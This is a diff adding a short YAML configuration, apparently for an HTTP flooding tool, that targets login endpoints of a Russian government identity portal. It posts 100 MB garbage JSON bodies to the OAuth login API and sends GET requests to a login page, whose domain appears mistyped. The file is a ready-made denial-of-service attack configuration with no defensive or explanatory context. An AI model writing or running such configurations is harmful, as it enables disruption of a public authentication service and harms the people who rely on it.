@@ -1,0 +1,12 @@
+strategies:
+  - target: https://esia.gosuslugi.rsu/login
+    type: http
+    method: get
+  - target: https://esia.gosuslugi.ru/aas/oauth2/api/login
+    type: http
+    method: post
+    body_generator: garbage
+    body_size: 104857600
+    additional_headers:
+      Content-Type: application/json
+    
